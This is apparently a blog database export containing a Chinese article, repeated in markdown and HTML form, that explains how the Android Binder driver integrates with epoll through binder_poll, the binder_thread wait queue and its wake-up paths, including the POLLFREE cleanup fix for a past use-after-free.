驱动自身通过 schedule() 使线程睡眠。\n\n因此，在等待过程中，Binder 驱动扮演被动角色——线程要么通过 binder_wait_for_work 主动睡眠（传统模式），要么通过 epoll 机制间接睡眠。但无论哪种模式，线程阻塞的核心是在 binder_thread->wait 等待队列上挂起。当该等待队列收到唤醒信号时，线程将被调度恢复运行，开始处理 Binder 事务或返回 epoll 结果。\n\nBinder 事务到来后的唤醒机制\n\n当Binder驱动中有新的事务或事件到来时，必须唤醒在等待该事件的线程。Binder内核通过在适当时机调用等待队列唤醒函数来实现这一点。结合 epoll 的情况，唤醒机制包括以下几种路径：\n\t•\t直接唤醒特定线程：如果Binder检测到有目标线程正阻塞等待（非epoll模式下在waiting_threads列表中），驱动会选取相应线程并唤醒。典型情况是在有事务投递给特定进程时，Binder调用 binder_select_thread_ilocked(proc) 从等待线程列表挑选一个空闲线程 ￼，然后调用 binder_wakeup_thread_ilocked(proc, thread, sync=false) 唤醒它 ￼。在 binder_wakeup_thread_ilocked 内，如果传入了特定 thread，则直接执行 wake_up_interruptible(&thread->wait)（或其同步版本）将该线程从 thread->wait 队列上唤醒 ￼。这会解除线程的阻塞，无论线程是通过 binder_wait_for_work 睡眠还是通过 epoll 间接睡眠，都将被激活准备处理 Binder 事务。\n\t•\t唤醒使用 epoll 的线程：如果目标进程中没有传统阻塞等待的线程（或所有线程都忙于事务），但有线程处于 epoll 监听状态（即 BINDER_LOOPER_STATE_POLL 标记的线程），Binder 驱动会尝试唤醒它们。具体地，binder_wakeup_thread_ilocked(proc, thread=NULL, sync=false) 处理了这种情况：当未指定特定线程时，它会调用 binder_wakeup_poll_threads_ilocked(proc, sync) ￼。该函数遍历该进程的所有线程节点，如果线程的 looper 状态包含 BINDER_LOOPER_STATE_POLL 且线程空闲可处理新的事务（通过 binder_available_for_proc_work_ilocked 判断），则执行 wake_up_interruptible(&thread->wait) 将其唤醒 ￼。由于 epoll 的等待节点挂在这些线程的等待队列上，wake_up_interruptible 不仅会唤醒可能休眠的Binder线程（如果其正通过binder_wait_for_work阻塞），也会触发epoll注册的回调。对于通过epoll_wait等待的线程来说，这相当于内核调用了 epoll 的 ep_poll_callback，将Binder文件描述符标记为就绪并唤醒正在epoll_wait的线程 ￼ ￼。换句话说，Binder驱动对 thread->wait 的唤醒会通知到epoll机制，促使在epoll_wait中休眠的线程被唤醒并察觉Binder fd变为可读。\n\t•\t线程退出和清理：当Binder线程退出或进程关闭Binder fd时，也需要唤醒等待队列以通知epoll机制解除关联。历史上，由于Binder线程结构可能提前释放，而epoll仍持有其等待队列指针，这曾导致UAF漏洞 ￼。为了解决此问题，新版内核在线程释放时使用 wake_up_poll(&thread->wait, EPOLLHUP | POLLFREE) 来专门唤醒等待队列并通知epoll清理 ￼。代码中检查了如果线程标记了 POLL 状态且等待队列上有等待者，就调用 wake_up_poll 发出带有 EPOLLHUP|POLLFREE 标志的唤醒 ￼。epoll 收到 POLLFREE 后会从其内部链表中移除对应的等待队列项，防止再次访问已经释放的 Binder 等待队列 ￼。这一机制确保资源安全回收。\n\n综上，Binder 事务到来时，内核会根据线程状态选择适当方式唤醒：对于直接阻塞等待的线程，通过 wake_up_interruptible 直接唤醒 ￼；对于通过 epoll 等待的线程，通过同样的等待队列唤醒机制激活 epoll 回调 ￼。所有这些唤醒最终都作用于 binder_thread->wait 等待队列，实现了 Binder 驱动与 epoll 等待机制的联动。唤醒发生的位置散布于 Binder 驱动不同函数中，例如新事务入队时的 binder_wakeup_proc_ilocked -> binder_wakeup_thread_ilocked 调用，或线程退出时的 binder_thread_release 调用 ￼。核心点在于：每当 Binder 有新工作可处理，就会调用 wake_up...(&thread->wait) 将相关等待线程（无论直接等待还是epoll等待）唤醒。\n\nepoll 与 binder_thread 结构中 wait 字段的结合使用\n\nBinder 驱动的 binder_thread 结构中包含一个 wait 字段，其类型为 wait_queue_head_t，这是 Linux 内核等待队列的头部类型 ￼ ￼。这个等待队列在 Binder 通信中扮演了举足轻重的角色，也是 epoll 能够与 Binder 集成的关键所在。其结合使用方式总结如下：\n\t•\tBinder_thread.wait 的初始化和作用：每当有线程与 Binder 驱动交互（例如通过 binder_open 后第一次执行 binder 操作），Binder 内核会确保为该线程分配 binder_thread 并初始化其 wait 队列 ￼。该等待队列用于挂载所有等待此线程Binder事件的等待者。对普通Binder线程而言，wait 队列用于实现阻塞读取：线程在没有事务时在此队列睡眠，直到有事务时被唤醒 ￼。对使用epoll的线程而言，wait 队列同样是休眠挂钩点，只是由epoll代为管理休眠/唤醒。\n\t•\tepoll 将自身等待项挂接到 wait 队列：正如前文所述，当调用 binder_poll 时，内核通过 poll_wait 将epoll的等待项注册到 binder_thread.wait 队列 ￼ ￼。从那一刻起，Binder线程的等待队列同时服务于两种等待者：Binder自有的等待（如果线程也可能调用binder_wait_for_work阻塞）以及epoll的等待者。binder_thread.wait 成为了连接Binder驱动和epoll机制的纽带 ￼。值得注意的是，Binder线程即使没有直接阻塞在Binder驱动上，只要epoll在等待，同样是通过这个wait队列来感知事件的 ￼。\n\t•\t通过 wait 队列进行事件传递：当Binder进程收到新事务、回复或其他可读事件时，Binder驱动对目标线程的 wait 队列调用唤醒函数（如 wake_up_interruptible） ￼。由于epoll的等待节点在该队列上，这个唤醒会调用epoll的回调，将事件标记为就绪并唤醒在epoll_wait休眠的线程 ￼。与此同时，如果线程本身也在该等待队列睡眠（Binder传统阻塞模式），也会被直接唤醒执行。例如，Binder驱动的事务分发代码中，一旦将事务加入目标线程/进程的队列，立即调用 binder_wakeup_proc_ilocked，进而触发对 thread->wait 的唤醒 ￼ ￼。\n\t•\t生命周期管理：因为 epoll 持续持有对 binder_thread.wait 的引用，所以 Binder 驱动在线程终止时也通过该等待队列与 epoll 通信（使用 wake_up_poll(..., POLLFREE)）通知epoll清理 ￼。正常情况下，只要 Binder 文件描述符不关闭，binder_thread.wait 的生命周期与 Binder 文件一致，epoll 挂载在其上也是安全的 ￼。Binder 驱动的新版本通过 POLLFREE 机制消除了使用 epoll 可能导致的生命周期问题，确保在 binder_thread 释放前将等待队列上的 epoll 引用移除 ￼。\n\n总的来说，binder_thread 结构中的 wait 字段充当了 Binder 驱动与 epoll 的桥梁：Binder 利用它来挂起/唤醒等待事务的线程，epoll 利用它来监听 Binder 事件的发生。一边是 Binder 内核通过 wait_queue_head_t 实现同步和通知 ￼，另一边是 epoll 通过在该等待队列注册回调实现事件驱动 ￼。两者的结合，使得 Binder 机制可以无缝集成到 Linux 通用的 IO 多路复用框架中。这不仅提高了灵活性，也使 Android 主线程等可以采用统一的 epoll 循环来监听 Binder 和其它事件，从架构上提高了效率和可维护性。通过上述机制，Binder 驱动成功地支持了 epoll 的监视，达到了预期的应用场景和目的。\n\n**参考资料：**Binder 驱动源码 ￼ ￼；Android Binder线程模型分析 ￼ ￼；CVE-2019-2215 漏洞相关代码解读 ￼ ￼等。","slug":"epoll","published":0,"date":"2025-05-25T11:56:04.128Z","updated":"2025-05-25T11:56:06.347Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44risz0009v8fy1mncdxjh","content":"<p>Binder驱动中 epoll 实现方式详解</p>\n<p>epoll 在 Binder 驱动中的应用场景和目的</p>\n<p>在 Android 系统中，Binder 驱动负责不同进程间的进程内通信。传统情况下，Binder 线程通过调用 ioctl (BINDER_WRITE_READ) 进入阻塞等待，有事务时再被内核唤醒 ￼。然而，对于某些场景（例如 Service Manager 或主线程需要同时处理多种事件源），让线程长时间阻塞于 Binder 可能不合适 ￼。为此，Binder 驱动提供了 epoll 支持，允许用户进程将 Binder 的文件描述符加入 epoll 事件循环，从而在不专门阻塞等待的情况下得到 Binder 事件通知 ￼。通过 epoll，应用可以将 /dev/binder 文件描述符与其他 IO 事件一起监视，主线程可以同时处理 UI、Socket 等事件以及 Binder 事务请求，实现高效的事件驱动模型 ￼。简而言之，epoll 在 Binder 中的目的在于提供异步事件通知机制：当有新的 Binder 事务或数据可读时，通过 epoll 触发回调或唤醒，从而避免线程一直阻塞等待，提高系统响应和资源利用率。</p>\n<p>binder_poll 函数的源码解析</p>\n<p>binder_poll 是 Binder 驱动实现的 poll 回调函数（在 binder_fops 文件操作结构体中注册为 .poll ￼）。当用户对 Binder 文件描述符调用 poll/epoll 时，该函数会被内核调用。binder_poll 的核心逻辑如下：<br>    •    获取/创建线程结构：首先，通过 filp-&gt;private_data 获取当前进程对应的 binder_proc，然后调用 binder_get_thread(proc) 获取当前内核线程对应的 binder_thread 结构。如果当前线程尚未有 binder_thread（首次调用），则会分配并初始化一个新的 binder_thread 对象 ￼ ￼。分配的新线程结构会初始化其各成员，包括将当前线程 PID 赋值，初始化工作队列等，尤其是调用 init_waitqueue_head(&amp;thread-&gt;wait) 初始化该线程的等待队列 ￼ ￼。这样每个调用 Binder 的线程都有自己专属的等待队列 thread-&gt;wait。<br>    •    设置线程状态：接着，Binder驱动将该线程标记为轮询模式：thread-&gt;looper |= BINDER_LOOPER_STATE_POLL ￼。这个标志表示线程正在通过 (e)poll 方式等待 Binder 事件。Binder 内核后续会据此判断唤醒逻辑（区分使用 epoll 的线程和传统阻塞等待的线程）。<br>    •    登记等待队列：调用 poll_wait(filp, &amp;thread-&gt;wait, wait) 将 Binder 驱动的等待队列注册到 poll 表中 ￼。这一行代码非常关键，它把 binder_thread-&gt;wait 等待队列添加到当前 poll 操作的等待列表中。当使用 epoll 时，内核实际上会借助 poll_wait 来挂钩等待队列：epoll 机制提供的回调（ep_ptable_queue_proc）会将一个自定义的等待队列项插入 thread-&gt;wait 中，以便后续唤醒 ￼。简单来说，执行到这里时，epoll 已经把自己的等待节点（带有 ep_poll_callback 回调的 wait_queue_t）添加到了 Binder 线程的等待队列 thread-&gt;wait 上 ￼。这一步确保了当 Binder 有事件时，epoll 可以收到通知。<br>    •    检查是否有可读事件：binder_poll 最后检查 Binder 是否已有可处理的工作。如果当前线程有待处理的事务或消息，则返回 EPOLLIN 事件，表示文件描述符可读；否则返回 0，表示当前无事件 ￼。具体实现上，通过调用 binder_has_work(thread, wait_for_proc_work) 来判断：该函数会检查当前线程的任务队列以及进程的待办事务列表，根据线程是否空闲来决定是否有工作需要处理 ￼ ￼。如果 binder_has_work 返回真，则 binder_poll 返回 EPOLLIN ￼，否则返回 0。需要注意的是，即使返回 0，poll_wait 已经使当前线程进入 thread-&gt;wait 等待队列，因此内核会让调用 poll/epoll_wait 的线程进入休眠，等待该等待队列上的事件唤醒 ￼。</p>\n<p>综上，binder_poll 的源码实现确保：一方面，将 Binder 线程的等待队列与 epoll 机制关联，使epoll能够监听 Binder 事件；另一方面，在调用时即时返回当前是否有事件需要处理，从而支持水平触发或边沿触发的 epoll 语义 ￼。</p>\n<p>epoll_ctl 添加 Binder 文件描述符的注册流程</p>\n<p>当应用通过 epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &amp;event) 将 Binder 文件描述符加入 epoll 兴趣列表时，内核会触发 Binder 驱动的 poll 方法注册过程。整个流程大致如下：<br>    1.    epoll 发起注册：epoll_ctl 调用内核的 ep_insert 函数，为新监视的文件描述符创建内部的数据结构（如 struct epitem 等）。在此过程中，内核会调用被监视文件的 poll 回调以完成注册 ￼。<br>    2.    调用 binder_poll：epoll 控制流程通过 file-&gt;f_op-&gt;poll 调用 Binder 驱动的 binder_poll 函数 ￼。正如上节分析的，binder_poll 内部首先确保当前线程有对应的 binder_thread（必要时分配）并标记 POLL 状态，然后执行 poll_wait 注册等待队列，最后返回当前事件状态 ￼。<br>    3.    epoll 挂钩等待队列：当 binder_poll 调用了 poll_wait(filp, &amp;thread-&gt;wait, wait) 时，epoll 提供的回调函数将执行 ￼ ￼。具体来说，epoll 的 poll_table 结构中 _qproc 指向 ep_ptable_queue_proc ￼。因此 poll_wait 会调用 ep_ptable_queue_proc(file, wait_queue_head_t *whead, poll_table *pt) ￼。该回调由 epoll 实现，用于将 epoll自身的等待项加入目标等待队列 ￼。在这个过程中，epoll 会分配一个 struct eppoll_entry（包含一个 wait_queue_t 条目）并初始化其回调为 ep_poll_callback ￼。然后，通过 add_wait_queue(whead, &amp;pwq-&gt;wait) 将此等待项添加到 Binder 驱动提供的等待队列 whead（即 thread-&gt;wait）上 ￼。同时，epoll 将该 eppoll_entry 链入自身的管理链表，以备将来删除时使用 ￼ ￼。这一系列操作将 Binder 线程的等待队列与 epoll 事件绑定：epoll 现在“关注”着 binder_thread-&gt;wait 上的唤醒事件。<br>    4.    初始事件检查：在完成等待队列挂钩后，Binder 的 binder_poll 会返回一个事件掩码（如 EPOLLIN 或 0） ￼。epoll 核心代码会据此决定是否立即将该 Binder 文件描述符视为“有事件”（例如如果返回 EPOLLIN，则可能立即触发epoll返回可读事件给用户)。如果返回0，则表示当前无事件，epoll不会把这个fd加入就绪队列，但已完成注册，等待后续唤醒。</p>\n<p>通过上述流程，epoll 完成了 Binder 文件描述符的注册。简而言之，在 epoll_ctl ADD 过程中，Binder 驱动的 binder_poll 被调用，并且 epoll 将自身等待节点挂入 Binder 线程的等待队列 ￼ ￼。从此，Binder 驱动的事件（例如新事务到来）就能够通过唤醒该等待队列来通知到 epoll。</p>\n<p>epoll 文件描述符与 Binder 驱动的挂钩初始化</p>\n<p>Binder 文件描述符与 epoll 的“挂钩”主要体现在 Binder 驱动初始化和线程初始化两个层面：<br>    •    打开 Binder 设备 (binder_open)：当进程打开 /dev/binder 时，Binder 驱动会创建并初始化一个 binder_proc 结构表示该进程，并将其指针存储在文件结构的 private_data 字段中 ￼。这个 binder_proc 包含该进程的 Binder 全局状态（如进程任务队列、线程红黑树等）。binder_open 只是初始化 binder_proc，并未产生具体线程等待队列。<br>    •    创建 Binder 线程 (binder_get_thread)：线程真正与 Binder 驱动挂钩发生在执行 binder 操作时，比如上文提到的 binder_poll 调用或 ioctl(BINDER_WRITE_READ) 时。binder_get_thread(proc) 函数在需要时分配 binder_thread 结构，将其加入 proc-&gt;threads 红黑树，并进行初始化 ￼。初始化过程中，特别重要的是 init_waitqueue_head(&amp;thread-&gt;wait) ￼——这为该线程创建了一个内核等待队列头，用于后续阻塞和唤醒。还设置了 thread-&gt;pid、thread-&gt;task 等信息，并将新线程节点插入 proc-&gt;threads 结构中 ￼。可以认为，这一步将 Binder 驱动和具体线程关联起来，为该线程准备好了等待队列等同步机制。<br>    •    epoll 挂钩 Binder 等待队列：在线程已存在且调用 binder_poll 时，Binder 驱动通过 poll_wait 提供了 thread-&gt;wait 给 epoll，epoll 随即将自己的等待项附加上去（见前节） ￼。从这一刻开始，Binder 的等待队列与 epoll 完成挂钩：epoll 文件描述符内部维护了指向 Binder 等待队列的引用，并依赖它来实现事件通知。</p>\n<p>经过上述初始化，Binder 驱动已经为 epoll 使用做好准备：Binder端有了特定线程的等待队列，epoll端也在该等待队列上注册了监听者。需要注意的是，如果Binder线程未通过 BC_REGISTER_LOOPER 等命令正式注册为Binder线程，也可以使用epoll机制等待Binder事件。但Binder驱动只有在线程标记了 BINDER_LOOPER_STATE_POLL（例如通过 binder_poll 设置）或进入等待状态时，才会将事务分发给它 ￼ ￼。因此通常在使用epoll前，会调用一次 binder_poll 或 BC_ENTER_LOOPER 等使线程登记到Binder驱动，确保Binder知道此线程存在并可被唤醒处理事务 ￼。</p>\n<p>线程等待 Binder 事件的阻塞过程</p>\n<p>在完成 epoll 注册后，用户空间线程会调用 epoll_wait 来等待事件，此时如果 Binder 没有立即可用的事件，线程将进入休眠阻塞等待。阻塞等待的实现机制如下：<br>    •    epoll_wait 侧的阻塞：当 epoll_wait 被调用且当前没有任何就绪事件时，内核会将调用线程置于睡眠状态，并挂在所有关联等待队列上。其中就包括 Binder 线程的 wait 队列。由于先前 poll_wait 已将 epoll 的等待节点添加到 binder_thread-&gt;wait，调用线程现在实际上受控于这个等待队列：如果 thread-&gt;wait 上触发唤醒，epoll_wait 就会被唤醒 ￼ ￼。换句话说，Binder 的等待队列是 epoll_wait 能否继续的决定因素之一。调用线程会一直阻塞，直到 Binder 有新事务/数据（或其他监视的文件描述符有事件）将其唤醒，或者直到超时/信号发生。<br>    •    Binder 内阻塞机制（对比）：值得对比的是，不使用 epoll 时，Binder 线程通常调用 ioctl(BINDER_WRITE_READ) 进入驱动读取流程，内部会调用 binder_wait_for_work() 阻塞等待 ￼。binder_wait_for_work 使用 prepare_to_wait(&amp;thread-&gt;wait, &amp;wait, TASK_INTERRUPTIBLE) 将当前线程挂到 thread-&gt;wait 队列，并调用 schedule() 休眠 ￼。如果有信号或被唤醒则跳出循环 ￼。可以看到，无论是 epoll 方式还是直接 ioctl 阻塞，本质上线程都睡在 binder_thread-&gt;wait 等待队列上。区别在于：epoll 情况下由 epoll 子系统管理休眠和唤醒；直接阻塞情况下由 Binder 驱动自身通过 schedule() 使线程睡眠。</p>\n<p>因此，在等待过程中，Binder 驱动扮演被动角色——线程要么通过 binder_wait_for_work 主动睡眠（传统模式），要么通过 epoll 机制间接睡眠。但无论哪种模式，线程阻塞的核心是在 binder_thread-&gt;wait 等待队列上挂起。当该等待队列收到唤醒信号时，线程将被调度恢复运行，开始处理 Binder 事务或返回 epoll 结果。</p>\n<p>Binder 事务到来后的唤醒机制</p>\n<p>当Binder驱动中有新的事务或事件到来时，必须唤醒在等待该事件的线程。Binder内核通过在适当时机调用等待队列唤醒函数来实现这一点。结合 epoll 的情况，唤醒机制包括以下几种路径：<br>    •    直接唤醒特定线程：如果Binder检测到有目标线程正阻塞等待（非epoll模式下在waiting_threads列表中），驱动会选取相应线程并唤醒。典型情况是在有事务投递给特定进程时，Binder调用 binder_select_thread_ilocked(proc) 从等待线程列表挑选一个空闲线程 ￼，然后调用 binder_wakeup_thread_ilocked(proc, thread, sync=false) 唤醒它 ￼。在 binder_wakeup_thread_ilocked 内，如果传入了特定 thread，则直接执行 wake_up_interruptible(&amp;thread-&gt;wait)（或其同步版本）将该线程从 thread-&gt;wait 队列上唤醒 ￼。这会解除线程的阻塞，无论线程是通过 binder_wait_for_work 睡眠还是通过 epoll 间接睡眠，都将被激活准备处理 Binder 事务。<br>    •    唤醒使用 epoll 的线程：如果目标进程中没有传统阻塞等待的线程（或所有线程都忙于事务），但有线程处于 epoll 监听状态（即 BINDER_LOOPER_STATE_POLL 标记的线程），Binder 驱动会尝试唤醒它们。具体地，binder_wakeup_thread_ilocked(proc, thread=NULL, sync=false) 处理了这种情况：当未指定特定线程时，它会调用 binder_wakeup_poll_threads_ilocked(proc, sync) ￼。该函数遍历该进程的所有线程节点，如果线程的 looper 状态包含 BINDER_LOOPER_STATE_POLL 且线程空闲可处理新的事务（通过 binder_available_for_proc_work_ilocked 判断），则执行 wake_up_interruptible(&amp;thread-&gt;wait) 将其唤醒 ￼。由于 epoll 的等待节点挂在这些线程的等待队列上，wake_up_interruptible 不仅会唤醒可能休眠的Binder线程（如果其正通过binder_wait_for_work阻塞），也会触发epoll注册的回调。对于通过epoll_wait等待的线程来说，这相当于内核调用了 epoll 的 ep_poll_callback，将Binder文件描述符标记为就绪并唤醒正在epoll_wait的线程 ￼ ￼。换句话说，Binder驱动对 thread-&gt;wait 的唤醒会通知到epoll机制，促使在epoll_wait中休眠的线程被唤醒并察觉Binder fd变为可读。<br>    •    线程退出和清理：当Binder线程退出或进程关闭Binder fd时，也需要唤醒等待队列以通知epoll机制解除关联。历史上，由于Binder线程结构可能提前释放，而epoll仍持有其等待队列指针，这曾导致UAF漏洞 ￼。为了解决此问题，新版内核在线程释放时使用 wake_up_poll(&amp;thread-&gt;wait, EPOLLHUP | POLLFREE) 来专门唤醒等待队列并通知epoll清理 ￼。代码中检查了如果线程标记了 POLL 状态且等待队列上有等待者，就调用 wake_up_poll 发出带有 EPOLLHUP|POLLFREE 标志的唤醒 ￼。epoll 收到 POLLFREE 后会从其内部链表中移除对应的等待队列项，防止再次访问已经释放的 Binder 等待队列 ￼。这一机制确保资源安全回收。</p>\n<p>综上，Binder 事务到来时，内核会根据线程状态选择适当方式唤醒：对于直接阻塞等待的线程，通过 wake_up_interruptible 直接唤醒 ￼；对于通过 epoll 等待的线程，通过同样的等待队列唤醒机制激活 epoll 回调 ￼。所有这些唤醒最终都作用于 binder_thread-&gt;wait 等待队列，实现了 Binder 驱动与 epoll 等待机制的联动。唤醒发生的位置散布于 Binder 驱动不同函数中，例如新事务入队时的 binder_wakeup_proc_ilocked -&gt; binder_wakeup_thread_ilocked 调用，或线程退出时的 binder_thread_release 调用 ￼。核心点在于：每当 Binder 有新工作可处理，就会调用 wake_up…(&amp;thread-&gt;wait) 将相关等待线程（无论直接等待还是epoll等待）唤醒。</p>\n<p>epoll 与 binder_thread 结构中 wait 字段的结合使用</p>\n<p>Binder 驱动的 binder_thread 结构中包含一个 wait 字段，其类型为 wait_queue_head_t，这是 Linux 内核等待队列的头部类型 ￼ ￼。这个等待队列在 Binder 通信中扮演了举足轻重的角色，也是 epoll 能够与 Binder 集成的关键所在。其结合使用方式总结如下：<br>    •    Binder_thread.wait 的初始化和作用：每当有线程与 Binder 驱动交互（例如通过 binder_open 后第一次执行 binder 操作），Binder 内核会确保为该线程分配 binder_thread 并初始化其 wait 队列 ￼。该等待队列用于挂载所有等待此线程Binder事件的等待者。对普通Binder线程而言，wait 队列用于实现阻塞读取：线程在没有事务时在此队列睡眠，直到有事务时被唤醒 ￼。对使用epoll的线程而言，wait 队列同样是休眠挂钩点，只是由epoll代为管理休眠/唤醒。<br>    •    epoll 将自身等待项挂接到 wait 队列：正如前文所述，当调用 binder_poll 时，内核通过 poll_wait 将epoll的等待项注册到 binder_thread.wait 队列 ￼ ￼。从那一刻起，Binder线程的等待队列同时服务于两种等待者：Binder自有的等待（如果线程也可能调用binder_wait_for_work阻塞）以及epoll的等待者。binder_thread.wait 成为了连接Binder驱动和epoll机制的纽带 ￼。值得注意的是，Binder线程即使没有直接阻塞在Binder驱动上，只要epoll在等待，同样是通过这个wait队列来感知事件的 ￼。<br>    •    通过 wait 队列进行事件传递：当Binder进程收到新事务、回复或其他可读事件时，Binder驱动对目标线程的 wait 队列调用唤醒函数（如 wake_up_interruptible） ￼。由于epoll的等待节点在该队列上，这个唤醒会调用epoll的回调，将事件标记为就绪并唤醒在epoll_wait休眠的线程 ￼。与此同时，如果线程本身也在该等待队列睡眠（Binder传统阻塞模式），也会被直接唤醒执行。例如，Binder驱动的事务分发代码中，一旦将事务加入目标线程/进程的队列，立即调用 binder_wakeup_proc_ilocked，进而触发对 thread-&gt;wait 的唤醒 ￼ ￼。<br>    •    生命周期管理：因为 epoll 持续持有对 binder_thread.wait 的引用，所以 Binder 驱动在线程终止时也通过该等待队列与 epoll 通信（使用 wake_up_poll(…, POLLFREE)）通知epoll清理 ￼。正常情况下，只要 Binder 文件描述符不关闭，binder_thread.wait 的生命周期与 Binder 文件一致，epoll 挂载在其上也是安全的 ￼。Binder 驱动的新版本通过 POLLFREE 机制消除了使用 epoll 可能导致的生命周期问题，确保在 binder_thread 释放前将等待队列上的 epoll 引用移除 ￼。</p>\n<p>总的来说，binder_thread 结构中的 wait 字段充当了 Binder 驱动与 epoll 的桥梁：Binder 利用它来挂起/唤醒等待事务的线程，epoll 利用它来监听 Binder 事件的发生。一边是 Binder 内核通过 wait_queue_head_t 实现同步和通知 ￼，另一边是 epoll 通过在该等待队列注册回调实现事件驱动 ￼。两者的结合，使得 Binder 机制可以无缝集成到 Linux 通用的 IO 多路复用框架中。这不仅提高了灵活性，也使 Android 主线程等可以采用统一的 epoll 循环来监听 Binder 和其它事件，从架构上提高了效率和可维护性。通过上述机制，Binder 驱动成功地支持了 epoll 的监视，达到了预期的应用场景和目的。</p>\n<p><strong>参考资料：</strong>Binder 驱动源码 ￼ ￼；Android Binder线程模型分析 ￼ ￼；CVE-2019-2215 漏洞相关代码解读 ￼ ￼等。</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>Binder驱动中 epoll 实现方式详解</p>\n<p>epoll 在 Binder 驱动中的应用场景和目的</p>\n<p>在 Android 系统中，Binder 驱动负责不同进程间的进程内通信。传统情况下，Binder 线程通过调用 ioctl (BINDER_WRITE_READ) 进入阻塞等待，有事务时再被内核唤醒 ￼。然而，对于某些场景（例如 Service Manager 或主线程需要同时处理多种事件源），让线程长时间阻塞于 Binder 可能不合适 ￼。为此，Binder 驱动提供了 epoll 支持，允许用户进程将 Binder 的文件描述符加入 epoll 事件循环，从而在不专门阻塞等待的情况下得到 Binder 事件通知 ￼。通过 epoll，应用可以将 /dev/binder 文件描述符与其他 IO 事件一起监视，主线程可以同时处理 UI、Socket 等事件以及 Binder 事务请求，实现高效的事件驱动模型 ￼。简而言之，epoll 在 Binder 中的目的在于提供异步事件通知机制：当有新的 Binder 事务或数据可读时，通过 epoll 触发回调或唤醒，从而避免线程一直阻塞等待，提高系统响应和资源利用率。</p>\n<p>binder_poll 函数的源码解析</p>\n<p>binder_poll 是 Binder 驱动实现的 poll 回调函数（在 binder_fops 文件操作结构体中注册为 .poll ￼）。当用户对 Binder 文件描述符调用 poll/epoll 时，该函数会被内核调用。binder_poll 的核心逻辑如下：<br>    •    获取/创建线程结构：首先，通过 filp-&gt;private_data 获取当前进程对应的 binder_proc，然后调用 binder_get_thread(proc) 获取当前内核线程对应的 binder_thread 结构。如果当前线程尚未有 binder_thread（首次调用），则会分配并初始化一个新的 binder_thread 对象 ￼ ￼。分配的新线程结构会初始化其各成员，包括将当前线程 PID 赋值，初始化工作队列等，尤其是调用 init_waitqueue_head(&amp;thread-&gt;wait) 初始化该线程的等待队列 ￼ ￼。这样每个调用 Binder 的线程都有自己专属的等待队列 thread-&gt;wait。<br>    •    设置线程状态：接着，Binder驱动将该线程标记为轮询模式：thread-&gt;looper |= BINDER_LOOPER_STATE_POLL ￼。这个标志表示线程正在通过 (e)poll 方式等待 Binder 事件。Binder 内核后续会据此判断唤醒逻辑（区分使用 epoll 的线程和传统阻塞等待的线程）。<br>    •    登记等待队列：调用 poll_wait(filp, &amp;thread-&gt;wait, wait) 将 Binder 驱动的等待队列注册到 poll 表中 ￼。这一行代码非常关键，它把 binder_thread-&gt;wait 等待队列添加到当前 poll 操作的等待列表中。当使用 epoll 时，内核实际上会借助 poll_wait 来挂钩等待队列：epoll 机制提供的回调（ep_ptable_queue_proc）会将一个自定义的等待队列项插入 thread-&gt;wait 中，以便后续唤醒 ￼。简单来说，执行到这里时，epoll 已经把自己的等待节点（带有 ep_poll_callback 回调的 wait_queue_t）添加到了 Binder 线程的等待队列 thread-&gt;wait 上 ￼。这一步确保了当 Binder 有事件时，epoll 可以收到通知。<br>    •    检查是否有可读事件：binder_poll 最后检查 Binder 是否已有可处理的工作。如果当前线程有待处理的事务或消息，则返回 EPOLLIN 事件，表示文件描述符可读；否则返回 0，表示当前无事件 ￼。具体实现上，通过调用 binder_has_work(thread, wait_for_proc_work) 来判断：该函数会检查当前线程的任务队列以及进程的待办事务列表，根据线程是否空闲来决定是否有工作需要处理 ￼ ￼。如果 binder_has_work 返回真，则 binder_poll 返回 EPOLLIN ￼，否则返回 0。需要注意的是，即使返回 0，poll_wait 已经使当前线程进入 thread-&gt;wait 等待队列，因此内核会让调用 poll/epoll_wait 的线程进入休眠，等待该等待队列上的事件唤醒 ￼。</p>\n<p>综上，binder_poll 的源码实现确保：一方面，将 Binder 线程的等待队列与 epoll 机制关联，使epoll能够监听 Binder 事件；另一方面，在调用时即时返回当前是否有事件需要处理，从而支持水平触发或边沿触发的 epoll 语义 ￼。</p>\n<p>epoll_ctl 添加 Binder 文件描述符的注册流程</p>\n<p>当应用通过 epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &amp;event) 将 Binder 文件描述符加入 epoll 兴趣列表时，内核会触发 Binder 驱动的 poll 方法注册过程。整个流程大致如下：<br>    1.    epoll 发起注册：epoll_ctl 调用内核的 ep_insert 函数，为新监视的文件描述符创建内部的数据结构（如 struct epitem 等）。在此过程中，内核会调用被监视文件的 poll 回调以完成注册 ￼。<br>    2.    调用 binder_poll：epoll 控制流程通过 file-&gt;f_op-&gt;poll 调用 Binder 驱动的 binder_poll 函数 ￼。正如上节分析的，binder_poll 内部首先确保当前线程有对应的 binder_thread（必要时分配）并标记 POLL 状态，然后执行 poll_wait 注册等待队列，最后返回当前事件状态 ￼。<br>    3.    epoll 挂钩等待队列：当 binder_poll 调用了 poll_wait(filp, &amp;thread-&gt;wait, wait) 时，epoll 提供的回调函数将执行 ￼ ￼。具体来说，epoll 的 poll_table 结构中 _qproc 指向 ep_ptable_queue_proc ￼。因此 poll_wait 会调用 ep_ptable_queue_proc(file, wait_queue_head_t *whead, poll_table *pt) ￼。该回调由 epoll 实现，用于将 epoll自身的等待项加入目标等待队列 ￼。在这个过程中，epoll 会分配一个 struct eppoll_entry（包含一个 wait_queue_t 条目）并初始化其回调为 ep_poll_callback ￼。然后，通过 add_wait_queue(whead, &amp;pwq-&gt;wait) 将此等待项添加到 Binder 驱动提供的等待队列 whead（即 thread-&gt;wait）上 ￼。同时，epoll 将该 eppoll_entry 链入自身的管理链表，以备将来删除时使用 ￼ ￼。这一系列操作将 Binder 线程的等待队列与 epoll 事件绑定：epoll 现在“关注”着 binder_thread-&gt;wait 上的唤醒事件。<br>    4.    初始事件检查：在完成等待队列挂钩后，Binder 的 binder_poll 会返回一个事件掩码（如 EPOLLIN 或 0） ￼。epoll 核心代码会据此决定是否立即将该 Binder 文件描述符视为“有事件”（例如如果返回 EPOLLIN，则可能立即触发epoll返回可读事件给用户)。如果返回0，则表示当前无事件，epoll不会把这个fd加入就绪队列，但已完成注册，等待后续唤醒。</p>\n<p>通过上述流程，epoll 完成了 Binder 文件描述符的注册。简而言之，在 epoll_ctl ADD 过程中，Binder 驱动的 binder_poll 被调用，并且 epoll 将自身等待节点挂入 Binder 线程的等待队列 ￼ ￼。从此，Binder 